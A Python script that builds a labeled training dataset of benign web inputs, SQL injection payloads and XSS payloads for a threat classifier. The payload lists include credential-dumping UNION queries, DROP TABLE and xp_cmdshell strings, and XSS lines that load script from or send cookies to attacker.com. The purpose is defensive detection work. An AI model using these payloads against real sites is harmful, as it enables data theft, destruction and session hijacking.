"""
Educational Threat Dataset Generator
------------------------------------
Creates a balanced, multi-class labeled dataset for training the NLP threat classifier.

Classes:
- 0: NORMAL (benign search queries, standard API slugs, valid usernames/passwords)
- 1: SQL_INJECTION (tautology, union-based, error-based, piggybacked SQL queries)
- 2: XSS (reflected/stored cross-site scripting payloads, inline scripts, event handlers)

Ethics & Legality:
This dataset contains purely educational, synthetic, and public security research examples.
No proprietary or private user data is used.
"""

import os
import json
import random

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_DATASET_CSV = os.path.join(BASE_DIR, "dataset.csv")

# 1. Normal / Benign Web Inputs
NORMAL_EXAMPLES = [
    "laptop", "gaming monitor", "mechanical keyboard", "wireless mouse",
    "usb c cable 2m", "apple macbook pro m2", "best headphones under 100",
    "shoes for running", "python programming book", "cotton t-shirt blue",
    "home", "about-us", "contact", "privacy-policy", "terms-and-conditions",
    "product?id=102&category=electronics", "catalog?page=2&sort=price_asc",
    "john_doe", "alice.smith@example.com", "admin_user_2024", "password123!",
    "search?q=spring+sale+discount", "view_order?order_id=983214",
    "checkout?shipping=standard&promo=WELCOME10", "settings?theme=dark&lang=en",
    "api/v1/users?limit=10&offset=20", "blog/post-10-cybersecurity-tips",
    "download/specs-datasheet.pdf", "search?q=ergonomic+chair+mesh",
    "reviews?rating=5&verified=true", "cart/add?item_id=554&qty=1",
    "newsletter/subscribe?email=user@test.org", "profile/edit?name=Johnathan",
    "faq/shipping-times", "help/return-policy", "index.html", "dashboard?view=summary",
    "assets/css/main.css", "assets/js/bundle.min.js", "images/banner-sale.jpg",
    "search?q=4k+oled+television+lg", "products/audio/bluetooth-speakers",
    "search?q=mechanical+pencil+0.5mm", "account/security/2fa-setup",
    "order/status?tracking=FEDEX-889922", "cart/checkout?step=billing"
]

# Variations for normal query strings
NORMAL_PATTERNS = [
    "search?q={}", "query={}&page=1", "filter?category={}&sort=desc",
    "item/{}?ref=homepage", "browse?tag={}", "api/search?term={}"
]

# 2. SQL Injection Payloads (Common evasion & exploitation vectors)
SQLI_EXAMPLES = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "\" OR \"1\"=\"1",
    "' OR 'a'='a",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' or 1=1#",
    "' or 1=1/*",
    ") or ('1'='1",
    "') or ('1'='1'--",
    "1' ORDER BY 1--+",
    "1' ORDER BY 2--+",
    "1' ORDER BY 3--+",
    "1' UNION SELECT null, null, null--",
    "' UNION SELECT username, password FROM users--",
    "' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",
    "1; DROP TABLE users--",
    "1; EXEC xp_cmdshell('dir')--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1' AND SLEEP(10)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' OR 1=1 LIMIT 1;--",
    "1' AND 1=(SELECT COUNT(*) FROM tabname); --",
    "' HAVING 1=1 --",
    "' GROUP BY column_name HAVING 1=1 --",
    "SELECT * FROM members WHERE username = 'admin' OR '1'='1'",
    "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
    "%27%20OR%201%3D1%20--",
    "%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--",
    "test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--"
]

# 3. Cross-Site Scripting (XSS) Payloads
XSS_EXAMPLES = [
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<script src=\"http://attacker.com/malicious.js\"></script>",
    "<img src=x onerror=alert('XSS')>",
    "<img src=\"invalid\" onerror=\"alert(document.cookie)\">",
    "<svg onload=alert(1)>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src=\"javascript:alert(`XSS`)\"></iframe>",
    "<a href=\"javascript:alert('XSS')\">Click here</a>",
    "\"><script>alert(document.domain)</script>",
    "'><script>alert('PWNED')</script>",
    "<input autofocus onfocus=alert(1)>",
    "<video><source onerror=\"javascript:alert(1)\">",
    "<details open ontoggle=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E",
    "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
    "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>",
    "<div onmouseover=\"alert('Hover XSS')\">Hover over me</div>",
    "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    "<isindex type=image src=1 onerror=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<object data=\"javascript:alert(1)\">"
]

def generate_dataset(total_samples: int = 1500) -> list:
    """
    Generates synthetic balanced educational dataset.
    Returns list of dicts: {"text": str, "label": int, "threat_type": str}
    """
    dataset = []
    
    # Generate Normal Samples (~50%)
    normal_target = total_samples // 2
    for _ in range(normal_target):
        word = random.choice(NORMAL_EXAMPLES)
        if random.random() > 0.4:
            pattern = random.choice(NORMAL_PATTERNS)
            sample_text = pattern.format(word.replace(" ", "+"))
        else:
            sample_text = word
        dataset.append({"text": sample_text, "label": 0, "threat_type": "NORMAL"})
        
    # Generate SQL Injection Samples (~25%)
    sqli_target = total_samples // 4
    for _ in range(sqli_target):
        base_payload = random.choice(SQLI_EXAMPLES)
        if random.random() > 0.5:
            prefix = random.choice(["search?q=", "login?user=", "item?id=", "filter="])
            sample_text = prefix + base_payload
        else:
            sample_text = base_payload
        dataset.append({"text": sample_text, "label": 1, "threat_type": "SQL_INJECTION"})
        
    # Generate XSS Samples (~25%)
    xss_target = total_samples - normal_target - sqli_target
    for _ in range(xss_target):
        base_payload = random.choice(XSS_EXAMPLES)
        if random.random() > 0.5:
            prefix = random.choice(["search?q=", "comment=", "query=", "redirect="])
            sample_text = prefix + base_payload
        else:
            sample_text = base_payload
        dataset.append({"text": sample_text, "label": 2, "threat_type": "XSS"})
        
    random.shuffle(dataset)
    return dataset

def save_dataset_csv(dataset: list, path: str):
    """Saves records to CSV format with proper quoting."""
    import csv
    with open(path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=["text", "label", "threat_type"])
        writer.writeheader()
        for row in dataset:
            writer.writerow(row)
    print(f"[+] Dataset saved to {path} ({len(dataset)} samples)")

if __name__ == "__main__":
    data = generate_dataset(2000)
    save_dataset_csv(data, OUTPUT_DATASET_CSV)
